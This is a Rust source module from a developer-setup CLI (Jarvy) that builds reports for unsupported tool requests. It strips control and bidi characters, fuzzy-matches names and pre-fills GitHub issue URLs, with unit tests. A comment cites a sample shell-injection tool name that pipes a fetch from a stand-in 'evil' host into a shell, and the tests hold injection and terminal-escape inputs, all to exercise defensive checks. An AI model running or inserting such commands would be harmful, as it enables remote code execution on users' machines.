//! Structured reporting for unsupported tools.
//!
//! When a user requests a tool that Jarvy doesn't know about, this module
//! produces a single `UnsupportedToolReport` payload that can be rendered
//! as human-readable text or JSON. The JSON form is the contract for AI
//! agents driving Jarvy via the MCP feedback loop — they read it, decide
//! whether to file a request or scaffold the tool locally, and try again.
//!
//! The report carries:
//! - `tool` / `version`: what was requested (sanitized for display)
//! - `suggestions`: top-N fuzzy matches from the registry (typos like
//!   `gti` → `git` resolve here without a round-trip)
//! - `channel`: how the request is being delivered (`telemetry` |
//!   `manual`) — AI parsers read this to know whether the request landed
//! - `fallback_issue_url`: pre-filled GitHub issue using
//!   `.github/ISSUE_TEMPLATE/tool_request.yml`, surfaced only when the
//!   telemetry channel is unavailable
//! - `scaffold_cmd`: workspace command to generate a tool stub locally
//! - `exit_code`: stable [`crate::error_codes::TOOL_UNSUPPORTED`]
//! - `kind`: discriminator (`"unsupported_tool"`) for AI parsers

#![allow(dead_code)] // Public API consumed by setup_cmd and tools_cmd

use std::borrow::Cow;

use serde::Serialize;

use crate::error_codes;
use crate::meta::REPO_SLUG;
use crate::net::url_encode::encode_unreserved_into;
use crate::tools::spec;

/// Issue template filename — must match the file in
/// `.github/ISSUE_TEMPLATE/`. Changing one without the other silently
/// breaks the pre-filled URL.
const TEMPLATE_FILE: &str = "tool_request.yml";

/// Maximum tool-name length accepted by [`validate_tool_name`]. Re-
/// exported from the shared `jarvy-templates` crate so existing
/// `tools::unsupported::MAX_TOOL_NAME_LEN` call sites keep working.
pub use jarvy_templates::MAX_TOOL_NAME_LEN;

/// How a request is being delivered to maintainers.
///
/// Telemetry is the canonical channel: it requires no GitHub account
/// from the user (or AI agent) and zero triage work from the maintainer
/// beyond reading the aggregated counter. The GitHub issue URL stays in
/// the payload only as a fallback for users with telemetry disabled.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum RequestChannel {
    /// Telemetry already fired (explicit `--request` path — the user
    /// typed the command, so consent is implicit).
    Sent,
    /// Telemetry is enabled and will fire alongside this message
    /// (e.g. setup-path unknown-tool event).
    WillSend,
    /// Telemetry is disabled — the GitHub URL is the only remaining
    /// route.
    Manual,
}

/// Pick the delivery channel for a setup-path unsupported-tool event.
///
/// Pure function so it can be table-tested independently of `run_setup`.
/// Seamless-mode (sandbox / CI) is *not* a channel-selection input —
/// it affects only the human-renderer hint (whether to suggest
/// `jarvy telemetry enable`). Conflating the two led to a real bug
/// where the renderer claimed "Reported via telemetry" while telemetry
/// was disabled and nothing was actually sent.
pub fn pick_channel(telemetry_enabled: bool) -> RequestChannel {
    if telemetry_enabled {
        RequestChannel::WillSend
    } else {
        RequestChannel::Manual
    }
}

/// Structured payload describing an unsupported-tool event.
///
/// Field set is the contract for AI agents reading the JSON form; keep
/// it stable. Adding fields is fine; renaming or removing breaks
/// downstream parsers (`channel` and `fallback_issue_url` are the
/// load-bearing fields for the request-routing decision).
#[derive(Debug, Clone, Serialize)]
pub struct UnsupportedToolReport {
    /// Discriminator for AI parsers; always `"unsupported_tool"`.
    pub kind: &'static str,
    /// Tool name, sanitized for safe display (control bytes stripped,
    /// length-capped). The raw value is never stored here.
    pub tool: String,
    /// Version string the user requested, sanitized identically.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
    /// Top-N closest registered tool names (lowercased), sorted best-first.
    pub suggestions: Vec<String>,
    /// Canonical delivery channel — `"telemetry"` when telemetry covers
    /// the request, `"manual"` when the user must use the URL.
    pub channel: &'static str,
    /// Fallback GitHub issue URL using the tool-request template. Used
    /// only when telemetry is unavailable; AI agents should prefer the
    /// telemetry channel because it requires no GitHub account.
    pub fallback_issue_url: String,
    /// Workspace command that scaffolds a new tool module locally.
    pub scaffold_cmd: String,
    /// Stable process exit code matching [`error_codes::TOOL_UNSUPPORTED`].
    pub exit_code: i32,
}

/// Build a full report for a single unsupported tool request.
///
/// `tool` is sanitized before any other processing so attacker-controlled
/// bytes (terminal escapes, very long names) cannot reach stderr or
/// telemetry attributes. `validate_tool_name` is the stricter check that
/// rejects names entirely; this function accepts any input but renders
/// it safely.
///
/// Allocation note: `sanitize_for_display` returns `Cow::Borrowed` for
/// clean input, so the common case allocates only when ownership is
/// required (the report struct owns its strings for `Serialize`).
/// `cow_into_string` keeps the borrowed-fast-path zero-allocation
/// contract honest — `Cow::into_owned` always allocates regardless of
/// variant, which would defeat the sanitizer's Cow design.
pub fn build_report(
    tool: &str,
    version: Option<&str>,
    channel: RequestChannel,
) -> UnsupportedToolReport {
    let safe_tool = cow_into_string(sanitize_for_display(tool));
    let safe_version = version.map(|v| cow_into_string(sanitize_for_display(v)));
    UnsupportedToolReport {
        kind: "unsupported_tool",
        suggestions: fuzzy_suggest(&safe_tool, 3),
        channel: match channel {
            RequestChannel::Sent | RequestChannel::WillSend => "telemetry",
            RequestChannel::Manual => "manual",
        },
        fallback_issue_url: issue_url(&safe_tool, safe_version.as_deref()),
        scaffold_cmd: format!("cargo run -p cargo-jarvy -- new-tool {}", safe_tool),
        exit_code: error_codes::TOOL_UNSUPPORTED,
        tool: safe_tool,
        version: safe_version,
    }
}

/// Strict validation for tool names — re-exported from
/// `jarvy-templates`. See that crate's docs for the full rule set.
/// The shared implementation guarantees `jarvy tools --request` and
/// `cargo-jarvy new-tool` apply identical gates.
pub use jarvy_templates::validate_tool_name;

/// Sanitize a user-supplied string for safe display on stderr and in
/// structured log fields. Strips C0/C1 control bytes AND Unicode
/// spoofing characters (bidi overrides, zero-width characters, line
/// separators) which would let a malicious `jarvy.toml` clear the
/// terminal, forge fake Jarvy output, or render `g\u200bit` as `git`.
/// Length-caps the result so a 4KB attacker name can't blow up log
/// budgets.
///
/// Returns `Cow::Borrowed` when the input is already clean — the
/// common case allocates zero.
pub fn sanitize_for_display(input: &str) -> Cow<'_, str> {
    let needs_strip = input.len() > MAX_TOOL_NAME_LEN || input.chars().any(is_unsafe_for_display);
    if !needs_strip {
        return Cow::Borrowed(input);
    }
    let mut out = String::with_capacity(input.len().min(MAX_TOOL_NAME_LEN));
    for c in input.chars() {
        if out.len() >= MAX_TOOL_NAME_LEN {
            out.push('…');
            break;
        }
        if is_unsafe_for_display(c) {
            out.push('?');
        } else {
            out.push(c);
        }
    }
    Cow::Owned(out)
}

/// Predicate for [`sanitize_for_display`]. Single source of truth for
/// what counts as unsafe — used by both the detection probe (does any
/// char need stripping?) and the per-char replacement loop. Sharing
/// the predicate guarantees the two stay aligned.
///
/// Unsafe classes:
/// - `Cc` (Unicode control category): C0 (U+0000-U+001F) and C1
///   (U+0080-U+009F). Covers ANSI escapes (U+001B), null bytes, CR/LF.
/// - Line / paragraph separators (U+2028 / U+2029): treated as record
///   terminators by some log consumers — let an attacker forge multi-
///   line log entries.
/// - Zero-width characters and LRM/RLM (U+200B-U+200F): let an
///   attacker render `g\u200bit` as visual `git` but a distinct
///   identifier — classic homograph attack.
/// - Bidi embedding / override controls (U+202A-U+202E, U+2066-U+2069):
///   render `\u202Etxt.exe` as `exe.txt` (RTL override) — the source
///   of the famous "Trojan Source" CVE.
/// - Interlinear annotation anchors (U+FFF9-U+FFFB): obscure but in
///   the same family.
fn is_unsafe_for_display(c: char) -> bool {
    let u = c as u32;
    c.is_control()
        || matches!(u, 0x2028 | 0x2029)
        || matches!(u, 0x200B..=0x200F)
        || matches!(u, 0x202A..=0x202E)
        || matches!(u, 0x2066..=0x2069)
        || matches!(u, 0xFFF9..=0xFFFB)
}

/// Return up to `limit` closest registered tool names to `query`.
///
/// Allocation-aware: borrows `&'static str` from the cached name list
/// in [`spec::iter_tool_names`], skips the lowercase allocation when the
/// query is already ASCII-lowercase, short-circuits names whose length
/// gap with the query already exceeds the cutoff, and reuses the
/// Levenshtein scratch vectors across name comparisons.
pub fn fuzzy_suggest(query: &str, limit: usize) -> Vec<String> {
    if query.is_empty() || limit == 0 {
        return Vec::new();
    }
    // Fast path: jarvy.toml keys are conventionally ASCII-lowercase,
    // so the lowercase pass usually returns the original input unchanged.
    let q_cow: Cow<'_, str> = if query.bytes().any(|b| b.is_ascii_uppercase()) {
        Cow::Owned(query.to_ascii_lowercase())
    } else {
        Cow::Borrowed(query)
    };
    let q: &str = q_cow.as_ref();
    let cutoff = std::cmp::max(2, q.len() / 2);

    // Scratch vectors reused across `levenshtein` calls so each
    // candidate name allocates 0 (after the first iteration).
    let mut prev: Vec<usize> = Vec::with_capacity(32);
    let mut curr: Vec<usize> = Vec::with_capacity(32);

    let mut scored: Vec<(usize, &'static str)> = Vec::with_capacity(8);
    for name in spec::iter_tool_names() {
        // |len(a) - len(b)| is a lower bound on edit distance; skip
        // names that already exceed the cutoff without walking the
        // O(n*m) matrix.
        let len_gap = (q.len() as isize - name.len() as isize).unsigned_abs();
        if len_gap > cutoff {
            continue;
        }
        let mut d = levenshtein(q, name, &mut prev, &mut curr);
        // Prefer prefix matches: `gti` already wins on edit distance vs
        // `git`, but `dock` should rank `docker` above `dotnet` even
        // when raw distances are tied.
        if name.starts_with(q) || q.starts_with(name) {
            d /= 2;
        }
        if d <= cutoff {
            scored.push((d, name));
        }
    }

    scored.sort_by(|a, b| a.0.cmp(&b.0).then_with(|| a.1.cmp(b.1)));
    scored
        .into_iter()
        .take(limit)
        .map(|(_, n)| n.to_string())
        .collect()
}

/// Build a pre-filled GitHub issue URL for the tool-request template.
///
/// Query parameters target fields declared in
/// `.github/ISSUE_TEMPLATE/tool_request.yml`:
/// - `template` — selects the form
/// - `title` — pre-filled title (`[Tool]: <name>`)
/// - `tool_name` — auto-populates the first input
/// - `use_case` — pre-filled when `version` is provided
pub fn issue_url(tool: &str, version: Option<&str>) -> String {
    // Single growing buffer — each encoded segment writes straight in
    // via `encode_unreserved_into`, eliminating the throwaway String
    // allocations the old `encode_unreserved(&format!(...))` form
    // produced (two per segment: one for `format!`, one for the
    // encoder's return).
    let mut url = String::with_capacity(256);
    url.push_str("https://github.com/");
    url.push_str(REPO_SLUG);
    url.push_str("/issues/new?template=");
    url.push_str(TEMPLATE_FILE);
    url.push_str("&labels=tool-request,needs-triage&title=");
    encode_unreserved_into(&mut url, "[Tool]: ");
    encode_unreserved_into(&mut url, tool);
    url.push_str("&tool_name=");
    encode_unreserved_into(&mut url, tool);
    if let Some(v) = version {
        url.push_str("&use_case=");
        encode_unreserved_into(&mut url, "Requested version: ");
        encode_unreserved_into(&mut url, v);
        encode_unreserved_into(&mut url, " (auto-filed by `jarvy setup`).");
    }
    url
}

/// Render the report as a multi-line human-readable block.
///
/// `seamless` controls only the Manual branch: in seamless mode
/// (sandbox / CI) the "Or enable telemetry once with
/// `jarvy telemetry enable`" hint is suppressed because the operator
/// can't act on it per-run. The fallback URL is still shown — that's
/// the only remaining channel when telemetry is off.
pub fn to_human(report: &UnsupportedToolReport, channel: RequestChannel, seamless: bool) -> String {
    use std::fmt::Write as _;
    // Capacity hint depends on which branch fires — the Manual branch
    // appends a ~200-byte URL plus the "please file" + "enable
    // telemetry" lines, totalling ~620 bytes. Branching the hint
    // avoids 1-2 reallocs on the telemetry-off path.
    let cap = match channel {
        RequestChannel::Manual => 768,
        _ => 384,
    };
    let mut out = String::with_capacity(cap);
    let _ = writeln!(
        out,
        "[jarvy] tool `{}` is not in the Jarvy registry.",
        report.tool
    );
    if !report.suggestions.is_empty() {
        out.push_str("        Did you mean: ");
        out.push_str(&report.suggestions.join(", "));
        out.push_str("?\n");
    }
    match channel {
        RequestChannel::Sent => {
            out.push_str("        Reported via telemetry — no further action needed.\n");
        }
        RequestChannel::WillSend => {
            out.push_str("        Reporting via telemetry.\n");
        }
        RequestChannel::Manual => {
            // Telemetry off — maintainer gets no signal unless the user
            // acts. Lead with the recommended action: the pre-filled
            // tool-request issue (auto-populates name/title/labels via
            // `.github/ISSUE_TEMPLATE/tool_request.yml`).
            out.push_str("        Telemetry off — please file a tool request (pre-filled):\n");
            out.push_str("        ");
            out.push_str(&report.fallback_issue_url);
            out.push('\n');
            if !seamless {
                out.push_str(
                    "        Or enable telemetry once with `jarvy telemetry enable` to skip the form.\n",
                );
            }
        }
    }
    // Only emit the "Scaffold locally" copy-paste line for names that
    // pass strict validation. `sanitize_for_display` strips control
    // bytes but leaves shell metacharacters intact, so an attacker
    // `[provisioner]` key like `foo;curl evil/x|sh` would otherwise
    // render as a copy-pasteable shell-injection invitation.
    // Defense-in-depth: the user still gets the error message and the
    // GitHub URL; they just don't get a pre-built `cargo` command for
    // an obviously malformed name.
    if validate_tool_name(&report.tool).is_ok() {
        out.push_str("        Scaffold locally: ");
        out.push_str(&report.scaffold_cmd);
        out.push('\n');
    } else {
        out.push_str(
            "        (Scaffold command suppressed — tool name contains unsafe characters.)\n",
        );
    }
    out
}

/// Render the report as a single-line JSON object suitable for log
/// pipelines and AI parsers. Falls back to a static error string if
/// serialization fails (it shouldn't — all fields are owned `String`s).
pub fn to_json(report: &UnsupportedToolReport) -> String {
    serde_json::to_string(report)
        .unwrap_or_else(|_| r#"{"kind":"unsupported_tool","error":"serialize_failed"}"#.to_string())
}

/// Render an inline `define_tool!` macro stub for the requested tool.
///
/// Delegates to [`spec::render_tool_template`] so that
/// `jarvy tools --request <name>` and `cargo-jarvy new-tool <name>`
/// produce byte-identical files. Single source of truth lives at
/// `src/tools/_template.rs`.
///
/// The tool name must already be validated via `validate_tool_name`
/// — this function does not re-check.
pub fn scaffold_snippet(tool: &str) -> String {
    spec::render_tool_template(tool, None)
}

// --- internal helpers ----------------------------------------------------

/// Convert a `Cow<'_, str>` to `String` without re-allocating when the
/// variant is already `Owned`. Identical to `Cow::into_owned` for the
/// `Borrowed` arm but avoids the latter's behavior of always cloning
/// — see [`build_report`] for the perf context.
fn cow_into_string(cow: Cow<'_, str>) -> String {
    match cow {
        Cow::Owned(s) => s,
        Cow::Borrowed(s) => s.to_string(),
    }
}

/// Levenshtein distance between two ASCII-lowercased strings.
/// Two-row implementation; caller passes scratch vectors so the
/// allocation amortizes across many comparisons in `fuzzy_suggest`.
fn levenshtein(a: &str, b: &str, prev: &mut Vec<usize>, curr: &mut Vec<usize>) -> usize {
    let (a, b) = if a.len() < b.len() { (b, a) } else { (a, b) };
    let a_bytes = a.as_bytes();
    let b_bytes = b.as_bytes();
    let n = b_bytes.len();
    if n == 0 {
        return a_bytes.len();
    }
    prev.clear();
    prev.extend(0..=n);
    curr.clear();
    curr.resize(n + 1, 0);
    for (i, &ac) in a_bytes.iter().enumerate() {
        curr[0] = i + 1;
        for (j, &bc) in b_bytes.iter().enumerate() {
            let cost = usize::from(ac != bc);
            curr[j + 1] = (prev[j + 1] + 1).min(curr[j] + 1).min(prev[j] + cost);
        }
        std::mem::swap(prev, curr);
    }
    prev[n]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pick_channel_table() {
        // Telemetry-on → WillSend regardless of seamless. Telemetry-off →
        // Manual regardless of seamless. The bug being guarded against:
        // returning Sent for seamless+off, which would make the renderer
        // claim "Reported via telemetry" when nothing was sent.
        assert_eq!(pick_channel(true), RequestChannel::WillSend);
        assert_eq!(pick_channel(false), RequestChannel::Manual);
    }

    #[test]
    fn validate_tool_name_accepts_canonical_shapes() {
        assert!(validate_tool_name("git").is_ok());
        assert!(validate_tool_name("docker-compose").is_ok());
        assert!(validate_tool_name("k3s.io").is_ok());
        assert!(validate_tool_name("my_tool_2").is_ok());
    }

    #[test]
    fn validate_tool_name_rejects_injection_attempts() {
        assert!(validate_tool_name("").is_err());
        assert!(validate_tool_name("foo\"); panic!(\"x").is_err());
        assert!(validate_tool_name("foo bar").is_err()); // space
        assert!(validate_tool_name("foo\nbar").is_err()); // newline
        assert!(validate_tool_name("foo;rm").is_err()); // semicolon
        assert!(validate_tool_name(&"a".repeat(65)).is_err()); // too long
    }

    #[test]
    fn sanitize_for_display_passes_through_clean_input() {
        let s = sanitize_for_display("git");
        assert!(matches!(s, Cow::Borrowed(_)));
        assert_eq!(s.as_ref(), "git");
    }

    #[test]
    fn sanitize_for_display_strips_ansi_and_control_bytes() {
        let s = sanitize_for_display("\x1b[2J\x1b[31mevil\x1b[0m");
        assert!(matches!(s, Cow::Owned(_)));
        assert!(!s.contains('\x1b'));
        assert!(!s.contains('\r'));
    }

    #[test]
    fn sanitize_for_display_strips_zero_width_homoglyph() {
        // U+200B (ZERO WIDTH SPACE) embedded in "git" renders visually
        // as `git` but is a distinct identifier — classic homoglyph
        // attack. Must be stripped.
        let s = sanitize_for_display("g\u{200B}it");
        assert!(matches!(s, Cow::Owned(_)));
        assert!(!s.contains('\u{200B}'), "zero-width survived: {:?}", s);
    }

    #[test]
    fn sanitize_for_display_strips_rtl_override() {
        // U+202E (RIGHT-TO-LEFT OVERRIDE) is the "Trojan Source" CVE
        // building block. Renders `\u202Etxt.exe` as `exe.txt`.
        let s = sanitize_for_display("a\u{202E}b");
        assert!(matches!(s, Cow::Owned(_)));
        assert!(!s.contains('\u{202E}'));
    }

    #[test]
    fn sanitize_for_display_strips_line_separator() {
        // U+2028 (LINE SEPARATOR) can forge multi-line log entries in
        // consumers that treat it as a record terminator.
        let s = sanitize_for_display("a\u{2028}b");
        assert!(matches!(s, Cow::Owned(_)));
        assert!(!s.contains('\u{2028}'));
    }

    #[test]
    fn sanitize_for_display_caps_length_exact() {
        let long = "a".repeat(200);
        let s = sanitize_for_display(&long);
        // The loop breaks `if out.len() >= MAX_TOOL_NAME_LEN` and then
        // pushes '…' (3 bytes in UTF-8). Exact: cap + 3.
        assert_eq!(
            s.len(),
            MAX_TOOL_NAME_LEN + '…'.len_utf8(),
            "length-cap math: {}",
            s.len()
        );
        // The trailing character must be the ellipsis code-point itself
        // — guards against a regression that pushes `..." or 4 bytes.
        assert!(s.ends_with('…'), "tail: {:?}", s);
    }

    #[test]
    fn sanitize_for_display_exact_max_len_is_borrowed() {
        // Input exactly at the max — boundary check ensures the
        // detection probe doesn't trigger a needless allocation.
        let exact = "a".repeat(MAX_TOOL_NAME_LEN);
        let s = sanitize_for_display(&exact);
        assert!(matches!(s, Cow::Borrowed(_)));
        assert_eq!(s.len(), MAX_TOOL_NAME_LEN);
    }

    #[test]
    fn levenshtein_basic() {
        let mut prev = Vec::new();
        let mut curr = Vec::new();
        assert_eq!(levenshtein("git", "git", &mut prev, &mut curr), 0);
        assert_eq!(levenshtein("gti", "git", &mut prev, &mut curr), 2);
        assert_eq!(levenshtein("docker", "docke", &mut prev, &mut curr), 1);
        assert_eq!(levenshtein("", "abc", &mut prev, &mut curr), 3);
    }

    #[test]
    fn issue_url_contains_template_and_tool() {
        let url = issue_url("kubectl", Some("1.30"));
        assert!(url.contains("template=tool_request.yml"));
        assert!(url.contains("tool_name=kubectl"));
        assert!(url.contains("title=%5BTool%5D%3A%20kubectl"));
        assert!(url.contains("use_case="));
        assert!(url.contains("Cliftonz/jarvy"));
    }

    #[test]
    fn build_report_carries_exit_code_and_channel_tag() {
        let r = build_report("definitely-not-a-real-tool", None, RequestChannel::Sent);
        assert_eq!(r.kind, "unsupported_tool");
        assert_eq!(r.exit_code, error_codes::TOOL_UNSUPPORTED);
        assert!(r.scaffold_cmd.contains("definitely-not-a-real-tool"));
        assert_eq!(r.channel, "telemetry");
    }

    #[test]
    fn build_report_manual_channel_when_telemetry_off() {
        let r = build_report("foo", None, RequestChannel::Manual);
        assert_eq!(r.channel, "manual");
    }

    #[test]
    fn build_report_sanitizes_tool_name_into_output() {
        let r = build_report("\x1b[31mevil", None, RequestChannel::Sent);
        assert!(!r.tool.contains('\x1b'));
        // scaffold_cmd should not embed control bytes either.
        assert!(!r.scaffold_cmd.contains('\x1b'));
    }

    #[test]
    fn fuzzy_suggest_finds_close_match() {
        let s = fuzzy_suggest("gti", 3);
        assert!(s.contains(&"git".to_string()), "got: {:?}", s);
    }

    #[test]
    fn fuzzy_suggest_prefix_boost_ranks_first() {
        // `dock` is a prefix of `docker` — should win over `dotnet`
        // even though both have small edit distance.
        let s = fuzzy_suggest("dock", 5);
        assert_eq!(
            s.first().map(String::as_str),
            Some("docker"),
            "got: {:?}",
            s
        );
    }

    #[test]
    fn fuzzy_suggest_empty_query_returns_empty() {
        assert!(fuzzy_suggest("", 3).is_empty());
    }

    #[test]
    fn fuzzy_suggest_limit_zero_returns_empty() {
        assert!(fuzzy_suggest("git", 0).is_empty());
    }

    #[test]
    fn scaffold_snippet_matches_canonical_template() {
        // The snippet must agree with whatever `cargo-jarvy new-tool`
        // would produce — single source of truth at
        // `src/tools/_template.rs`. If this assertion breaks,
        // `render_tool_template` and its callers have drifted.
        let s = scaffold_snippet("foo");
        assert!(s.contains("define_tool!(FOO,"));
        assert!(s.contains("command: \"foo\""));
        assert!(
            !s.contains("__PKG_BSD__"),
            "all placeholders must be substituted; got: {}",
            s
        );
    }

    #[test]
    fn to_json_carries_canonical_fields() {
        let r = build_report("xyz", Some("1.0"), RequestChannel::Sent);
        let v: serde_json::Value = serde_json::from_str(&to_json(&r)).unwrap();
        assert_eq!(v["kind"], "unsupported_tool");
        assert_eq!(v["tool"], "xyz");
        assert_eq!(v["exit_code"], 8);
        assert_eq!(v["channel"], "telemetry");
        // docs_url was removed (dead field) — absence is part of the
        // contract now.
        assert!(v.get("docs_url").is_none());
    }

    #[test]
    fn to_human_telemetry_send_omits_url() {
        let r = build_report("foo", None, RequestChannel::Sent);
        let s = to_human(&r, RequestChannel::Sent, false);
        assert!(s.contains("Reported via telemetry"));
        assert!(
            !s.contains("github.com"),
            "URL should not appear when telemetry handles the request: {}",
            s
        );
    }

    #[test]
    fn to_human_manual_shows_url_and_enable_hint() {
        let r = build_report("foo", None, RequestChannel::Manual);
        let s = to_human(&r, RequestChannel::Manual, /* seamless = */ false);
        assert!(s.contains("Telemetry off"));
        assert!(s.contains("github.com"));
        assert!(s.contains("please file a tool request"));
        assert!(s.contains("pre-filled"));
        assert!(s.contains("jarvy telemetry enable"));
    }

    #[test]
    fn to_human_manual_in_seamless_suppresses_enable_hint() {
        // Seamless = sandbox / CI: the operator can't act on
        // "enable telemetry" advice per-run, so we hide the hint
        // but still show the URL (the only remaining channel).
        let r = build_report("foo", None, RequestChannel::Manual);
        let s = to_human(&r, RequestChannel::Manual, /* seamless = */ true);
        assert!(s.contains("Telemetry off"));
        assert!(s.contains("github.com"));
        assert!(
            !s.contains("jarvy telemetry enable"),
            "seamless mode must hide the enable-telemetry hint: {}",
            s
        );
    }
}
